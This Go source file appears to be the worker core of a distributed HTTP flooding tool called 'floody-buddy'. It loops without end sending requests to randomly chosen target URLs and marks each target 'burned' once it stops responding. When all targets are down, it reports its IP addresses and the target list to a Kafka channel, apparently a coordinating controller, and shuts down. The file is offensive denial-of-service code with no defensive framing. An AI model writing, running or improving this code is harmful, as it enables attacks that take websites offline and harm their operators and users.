package spammer

import (
	"math/rand"

	"floody-buddy/internal/models"
	"floody-buddy/internal/utils"
	"floody-buddy/pkg/kafka"
	"floody-buddy/pkg/logger"
)

var burnedUrls = make(map[string]bool)
var urls = utils.FormatUrls()
var log = logger.New()

func init() {
	for _, url := range urls {
		burnedUrls[url] = false
	}
}

func Flood() {
	for {
		if len(urls) == 1 {
			if !IsBurned(urls[0]) {
				err := utils.MakeRequest(urls[0])
				if err != nil {
					BurnUrl(urls[0])
				}
			} else {
				if AllBurned() {
					TriggerShutdown()
				}
			}
		} else {
			if AllBurned() {
				TriggerShutdown()
			}
			randomIndex := rand.Intn(len(urls))
			if !IsBurned(urls[randomIndex]) {
				err := utils.MakeRequest(urls[randomIndex])
				if err != nil {
					BurnUrl(urls[randomIndex])
				}
			}
		}
	}
}

func TriggerShutdown() {
	log.Info().Msg("Triggering shutdown")
	ips, err := utils.GetIPAddresses()
	if err != nil {
		log.Error().Err(err).Msg("Failed to get IP addresses")
		utils.Shutdown()
	}
	message := models.Message{
		IpAddress: ips,
		Urls:      urls,
	}

	payload, err := utils.FormatMessage(message)
	if err != nil {
		log.Error().Err(err).Msg("Failed to format message")
		utils.Shutdown()
	}

	kafka.PublishMessage(payload)
	utils.Shutdown()
}

func AllBurned() bool {
	for _, url := range urls {
		if !IsBurned(url) {
			return false
		}
	}
	log.Info().Msg("All URLs have been burned")
	return true
}

func BurnUrl(url string) {
	log.Debug().Str("url", url).Msg("Burned URL")
	burnedUrls[url] = true
}

func IsBurned(url string) bool {
	return burnedUrls[url]
}
